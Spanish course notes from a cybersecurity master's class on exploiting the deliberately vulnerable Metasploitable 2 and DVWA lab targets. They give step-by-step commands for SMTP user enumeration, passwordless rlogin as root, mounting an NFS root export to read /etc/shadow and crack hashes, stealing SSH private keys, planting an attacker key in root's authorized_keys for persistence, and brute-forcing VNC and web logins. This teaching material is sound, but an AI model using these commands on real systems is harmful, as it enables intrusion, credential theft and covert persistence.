> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 23**
> **Módulo:** MODULO3
> **Tema:** Clase 23
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 23. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

---

--
Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy

## 1.

Contexto y objetivos de la sesión

El profesor **Dani** continúa exactamente donde se dejó en la Clase 21, completando el recorrido puerto a puerto de Metasploitable 2.

En esta sesión se cubren los servicios pendientes: SMTP, Servicios R, NFS, claves SSH, VNC, y la primera toma de contacto con Burp Suite para hacking web.

**Repaso de la sesión anterior:** - FTP vsftpd 2.3.4 → explotado por script Python y Metasploit - SSH → fuerza bruta con Metasploit (módulo ssh_login) - Telnet → credenciales en texto claro, escalada con sudo -l - SMB → enumeración con smbclient, exploit Samba 3.0.20 - Puerto 80 → fuzzing con FFUF, hallazgo de phpinfo.php con CGI habilitado

**VMware vs.

VirtualBox:** el profesor recomienda VMware sobre VirtualBox para evitar problemas con el portapapeles bidireccional y la visibilidad de máquinas.

Existe una versión Pro de VMware gratuita disponible en GitHub.

## 2.

Fuzzing web con FFUF y DirBuster --- repaso ampliado

### Mecánica del FFUF

ffuf -u http://IP/FUZZ -w /ruta/diccionario -c

- FUZZ es el marcador que se sustituye por cada palabra del diccionario.
- -w → wordlist a usar.
- -c → colores en el output.
- Los resultados positivos son los que tienen código de estado diferente (200, 301...).

**Para buscar subdominios** (FUZZ al principio de la URL):

ffuf -u http://FUZZ.dominio.com/ -w /ruta/diccionario

### Diccionarios recomendados por el profesor

Diccionario Tamaño Uso
 ------------------------------------------ -------------------- ----------------------------------
common.txt (DirBuster) \~400-500 entradas Rápido, primer escaneo directory-list-2.3-medium.txt (SecLists) Grande Exhaustivo, encuentra phpinfo.php SecLists ficheros Grande Solo ficheros, no directorios

**SecLists** se instala con:

```bash
git clone https://github.com/danielmiessler/SecLists
```

> [!important] **Diferencia clave:** el diccionario medium de SecLists encontró /phpinfo.php cuando el de DirBuster básico no lo encontró.

En una auditoría real, usar siempre SecLists como segunda pasada.

**RockYou:** útil para romper hashes (cracking de contraseñas), no para fuzzing de directorios.

Para directorios en entornos reales, usar SecLists.

## 3.

SMTP (Puerto 25) --- Enumeración de usuarios

SMTP (*Simple Mail Transfer Protocol*) es el protocolo de envío de correo electrónico.

Su interés ofensivo en esta fase no es explotar el correo, sino **enumerar usuarios del sistema** aprovechando que el protocolo permite preguntar si un usuario existe.

### Comandos SMTP manuales

telnet IP 25 # Conectar directamente al servidor SMTP EHLO dominio.com # Saludo inicial, establece la sesión VRFY usuario # Verifica si ese usuario existe (respuesta diferente si existe o no)

El comando VRFY responde de forma distinta según si el usuario existe o no, lo que permite enumerar usuarios válidos uno a uno.

### Enumeración automática con Metasploit

msfconsole search smtp use [módulo smtp_enum] show options set RHOSTS IP_METASPLOITABLE set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt run

Resultado de la demo: se enumeraron usuarios del sistema (back, bin, daemon, ftp, games, www-data, user...).

El usuario www-data es especialmente relevante: es la cuenta de servicio del servidor web.

Si se hackea la web, se entra como www-data.

**Uso de los usuarios enumerados:** guardarlos en un fichero .txt y usarlos como diccionario de usuarios en ataques de fuerza bruta posteriores (SSH, FTP, login web).

## 4.

Servicios R (Puertos 512, 513, 514) --- Acceso remoto sin autenticación

Los **servicios R** (rlogin, rsh, rexec) son protocolos de acceso remoto anteriores a SSH, completamente inseguros y obsoletos.

Su vulnerabilidad principal: si el archivo .rhosts está mal configurado, permiten conexiones **sin ningún tipo de autenticación**.

### El archivo .rhosts

El archivo /etc/hosts.equiv o \~/.rhosts especifica qué hosts o IPs de confianza pueden conectarse sin contraseña.

Una configuración de \* \* (comodín) permite que **cualquier IP** del mundo se conecte sin credenciales.

### Explotación

```bash
apt install rsh-client # Si no está instalado rlogin -l root IP # Conectar como root sin contraseña
```

Resultado: shell directamente como root por mala configuración del .rhosts.

## 5.

NFS (Puerto 2049) --- Montar el sistema de ficheros completo

**NFS** (*Network File System*) es el equivalente Linux a los recursos compartidos SMB de Windows.

Permite compartir carpetas Linux por red.

En Metasploitable 2 está mal configurado: tiene **compartida la raíz** / **del sistema completo** con acceso desde cualquier IP.

### Flujo de explotación

1\.

Verificar que NFS está activo:

rpcinfo -p IP # Enumera servicios RPC; NFS aparece como "nfs" en puerto 2049

2\.

Listar recursos compartidos:

showmount -e IP # Lista las carpetas compartidas

Resultado: / exportado para \* → todo el sistema está compartido para cualquiera.

3\.

Montar el sistema de ficheros en local:

```bash
mkdir /home/kali/Desktop/carpeta_meta2 mount -t nfs IP:/ /home/kali/Desktop/carpeta_meta2 cd /home/kali/Desktop/carpeta_meta2 ls # Se ve todo el sistema de ficheros de Metasploitable 2
```

### ¿Qué hacer con el sistema de ficheros montado?

Una vez montado todo el sistema en local, se puede acceder a cualquier fichero de la máquina víctima desde Kali:

Extraer hashes de contraseñas:

```bash
cat /home/kali/Desktop/carpeta_meta2/etc/shadow
```

El fichero shadow contiene los hashes de todos los usuarios.

El prefijo \$1\$ indica hash MD5 (md5crypt).

El \* en el campo de hash indica cuenta deshabilitada.

Identificar el tipo de hash:

hashid hash_extraído # Herramienta que identifica el algoritmo del hash

Hashcat necesita el número de modo correcto para cada algoritmo (ej.

MD5crypt = modo 500).

Romper los hashes con John the Ripper:

# Combinar /etc/passwd y /etc/shadow para John:

unshadow /ruta/montaje/etc/passwd /ruta/montaje/etc/shadow > hashes.txt john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt

# Ver contraseñas ya rotas:

john hashes.txt --show

Romper los hashes con Hashcat (GPU, más rápido):

hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt

- -m 500 → modo MD5crypt (obtenido de hashid o la documentación de Hashcat).
- Hashcat consume mucha CPU/GPU; cuidado con el rendimiento del equipo.

**Recomendación del profesor:** Hashcat es más potente que John porque permite aplicar **reglas de transformación** (añadir fechas, cambiar mayúsculas, añadir símbolos) además de diccionarios, lo que aumenta la probabilidad de éxito sin ampliar el diccionario.

Robar claves SSH privadas desde el montaje:

```bash
ls -la /ruta/montaje/home/msfadmin/.ssh/ # Archivos ocultos en el .ssh cat /ruta/montaje/home/msfadmin/.ssh/id_rsa # Clave privada cp /ruta/montaje/home/msfadmin/.ssh/id_rsa /home/kali/Desktop/id_rsa_robada chmod 600 /home/kali/Desktop/id_rsa_robada # Permisos correctos para usar la clave ssh -i /home/kali/Desktop/id_rsa_robada msfadmin@IP # Conectar con la clave robada
```

## 6.

Claves SSH: par público-privado y persistencia

### Concepto del par de claves

- **Clave privada (**id_rsa**):** se guarda en el cliente atacante.

Nunca se comparte.

Si está protegida con *passphrase*, pide contraseña al usarla.
- **Clave pública (**id_rsa.pub**):** se coloca en el servidor, en el archivo \~/.ssh/authorized_keys del usuario de destino.

No pasa nada si se filtra.
- **Cómo funciona:** SSH verifica que la clave privada del cliente corresponde matemáticamente con alguna clave pública del authorized_keys.

Si hay coincidencia, permite la conexión sin contraseña.

### Hallazgo en la demo

La clave pública del usuario msfadmin y la del usuario root eran **exactamente la misma**.

Esto significaba que la clave privada encontrada podía usarse para conectarse como root.

```bash
ssh -i id_rsa_robada root@IP # Acceso directo como root
```

### Persistencia mediante inyección de clave propia

En lugar de robar la clave existente, se puede **crear un par propio e inyectar la pública** en el authorized_keys de la víctima:

# En Kali: generar nuevo par de claves

```bash
ssh-keygen -t rsa # Sin passphrase para no pedir contraseña al conectar
```

# Copiar la clave pública al authorized_keys de la víctima

# (usando el acceso NFS ya montado)

```bash
cat id_rsa.pub >> /ruta/montaje/root/.ssh/authorized_keys
```

# Conectar desde Kali con nuestra clave privada

```bash
ssh -i id_rsa root@IP # Acceso como root con nuestra propia clave
```

**Por qué esto es persistencia:** aunque se parchee la vulnerabilidad NFS o la de la clave robada, nuestra clave pública sigue en el authorized_keys.

El acceso permanece mientras no la eliminen explícitamente.

## 7.

VNC (Puerto 5900) --- Escritorio remoto con fuerza bruta

**VNC** (*Virtual Network Computing*) permite acceso a un escritorio remoto gráfico, similar a RDP en Windows.

### Fuerza bruta de VNC con Hydra

hydra -P /usr/share/wordlists/rockyou.txt IP vnc

- VNC solo tiene contraseña (no usuario), por eso solo se usa -P (contraseña), no -l.
- Resultado: contraseña encontrada → password.

### Acceso al escritorio remoto

vncviewer IP # Aplicación VNC viewer instalada en Kali

# Introducir la contraseña encontrada: "password"

Resultado: escritorio gráfico completo de Metasploitable 2.

Una vez dentro del entorno gráfico, la escalada de privilegios es trivial.

## 8.

Puerto 80 --- Introducción a Burp Suite

### Configuración del proxy: FoxyProxy

**FoxyProxy** es una extensión del navegador que permite redirigir el tráfico a través de un proxy con un solo clic.

Evita tener que configurar manualmente el proxy del sistema cada vez.

**Extensiones recomendadas para instalar en Firefox/Chrome:** - **FoxyProxy** → redirigir tráfico a Burp Suite con un clic - **Wappalyzer** → detecta tecnologías web del sitio visitado (CMS, frameworks, servidores)

**Configuración del proxy de Burp Suite:** - Burp Suite escucha por defecto en 127.0.0.1:8080 - FoxyProxy apunta a esa dirección - Al activar FoxyProxy, todo el tráfico del navegador pasa por Burp antes de llegar al servidor

### Funcionamiento de Burp Suite como proxy interceptador

Con Burp Suite activo y el modo **Intercept ON**: - Cada petición HTTP/HTTPS queda **pausada** en Burp antes de enviarse al servidor. - El auditor puede ver y modificar cualquier parámetro (usuario, contraseña, tokens, cabeceras...) antes de reenviarla.

Con **Intercept OFF** pero FoxyProxy activo: - Las peticiones pasan directamente al servidor pero Burp las **registra todas** en el historial. - Permite navegar con normalidad y luego revisar todas las peticiones capturadas.

**Uso práctico del historial:** navegar por la aplicación con el proxy activo pero sin interceptar; luego en Burp revisar el historial y encontrar peticiones con parámetros interesantes (formularios, tokens, cookies).

### Fuerza bruta en formularios con Burp Intruder

### Flujo demostrado:

## 1.

Interceptar la petición POST del login de DVWA con Burp.

## 2.

Enviar la petición al módulo **Intruder** (clic derecho → Send to Intruder).

## 3.

En Intruder, marcar el campo de usuario o contraseña como posición del payload (§usuario§).

## 4.

Cargar un diccionario como payload (lista de usuarios o contraseñas).

## 5.

Lanzar el ataque.

## 6.

Identificar la petición correcta por la **diferencia en el código de respuesta** o en el **tamaño de la respuesta**:

 - Login incorrecto → 302 (redirección a login.php) + tamaño de respuesta constante.
 - Login correcto → 302 hacia index.php (destino diferente) o código/tamaño diferente.

**Opciones del Intruder:** - **Tipo Sniper:** un solo payload, prueba cada valor en la posición marcada. - **Tipo Cluster Bomb:** dos payloads (usuario + contraseña), prueba todas las combinaciones. - **Configurar delay:** Options → Request Engine → Throttle (ms) para evitar bloqueos por rate limiting.

### DVWA (Damn Vulnerable Web Application)

La aplicación web instalada en el puerto 80 de Metasploitable 2 es **DVWA**, una aplicación deliberadamente vulnerable diseñada para práctica.

Tiene diferentes niveles de dificultad (Low, Medium, High) y cubre todas las vulnerabilidades del OWASP Top 10.

## 9.

Próxima sesión

Se profundizará en el hacking web: - Acceso a la base de datos MySQL vía phpMyAdmin. - Subir ficheros a la base de datos para obtener **RCE** (ejecución remota de código). - Local File Inclusion (LFI) para leer ficheros internos del servidor. - **Burp Suite** en profundidad para automatizar ataques web.

## 10.

Conceptos y términos clave corregidos

Término en la transcripción Corrección / Aclaración
 ------------------------------------------ ----------------------------------------------------------------------------------------
animab / N más **Nmap** -- escáner de puertos y servicios Metrasploid / MetaSprout / MetaExplotado Metasploit Framework / Metasploitable 2 FSUF / FFF / f f uf **FFUF** (*Fuzz Faster U Fool*) -- herramienta de fuzzing web footing / foozing / fuzzy **Fuzzing** -- técnica de enumeración web por fuerza bruta de rutas sek list / Saglists / selleris **SecLists** -- colección de diccionarios para pentesting RockJue / rugby **RockYou (rockyou.txt)** -- diccionario de contraseñas DealBuster / DirectBuster **DirBuster** -- herramienta y diccionario de fuzzing web ports MTP / ports SMP **SMTP** (*Simple Mail Transfer Protocol*) -- protocolo de correo hello **EHLO / VRFY** -- comandos SMTP para saludo e identificación de usuarios r login / RSEC / ARCH **rlogin / rsh / rexec** -- servicios R de acceso remoto sin autenticación punto rhost / R Host .rhosts -- archivo de configuración que define hosts de confianza para servicios R Network Fire System **NFS** (*Network File System*) -- protocolo para compartir carpetas Linux en red show month / show mount **showmount** -- comando para listar recursos NFS compartidos hash identifyer / hash identifier **hashid / hash-identifier** -- herramienta para identificar el tipo de hash John y hascart **John the Ripper** y **Hashcat** -- herramientas de cracking de hashes unshadow **unshadow** -- combina /etc/passwd y /etc/shadow para John the Ripper permisos de gestación **chmod 600** -- permisos correctos para una clave privada SSH autoridad de un keys / authority on keys \~/.ssh/authorized_keys -- archivo donde se guardan las claves públicas SSH autorizadas UNC / VNF **VNC** (*Virtual Network Computing*) -- protocolo de escritorio remoto VNC Piware **VNC Viewer** -- cliente para conectarse a servidores VNC Wap Palaiser / Wappalizer **Wappalyzer** -- extensión del navegador que detecta tecnologías web FoxyCloxi / Foxy proxy **FoxyProxy** -- extensión para gestionar proxies en el navegador Booth / Burp suit **Burp Suite** -- proxy de interceptación para auditorías web UCI / RCH / una clave **RCE** (*Remote Code Execution*) -- ejecución remota de código CDMX / CMD punto EX **cmd.exe** -- intérprete de comandos de Windows PHP Miami / HP MyAdmint **phpMyAdmin** -- interfaz web de administración de bases de datos MySQL DVWA / base de web **DVWA** (*Damn Vulnerable Web Application*) -- aplicación web vulnerable para práctica

Resumen elaborado para uso académico en el Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Chema/Maquinas/HackTheBox Starting Point — Tier 1.md|HackTheBox Starting Point — Tier 1]] — FFUF, Metasploit, Telnet
- [[resumen_master_clase25.md|resumen_master_clase25]] — FFUF, IA en Ciberseguridad, Metasploit
- [[resumen_master_clase21.md|resumen_master_clase21]] — FFUF, IA en Ciberseguridad, Metasploit
- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Explotación Avanzada de Servicios Vulnerables III — NFS, Tomcat y MySQL.md|Explotación Avanzada de Servicios Vulnerables III — NFS, Tomcat y MySQL]] — Linux, SSH, Windows
- [[resumen_master_clase35.md|resumen_master_clase35]] — IA en Ciberseguridad, Linux, Nmap
- [[../../apuntes Chema/Maquinas/HTB Starting Point — Repaso e inicio de Tier 2.md|HTB Starting Point — Repaso e inicio de Tier 2]] — Linux, Nmap, SSH

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/FFUF|FFUF]]
- [[comandos/Hydra|Hydra]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/SSH|SSH]]
- [[comandos/Telnet|Telnet]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]

> #burpsuite #command-injection #escalada-privilegios #ffuf #hack-the-box #hydra #ia #john #kali #lfi #linux #metasploit #metasploitable #netcat #nmap #post-explotacion #redes #reverse-shell #smb-impacket #ssh #telnet #windows
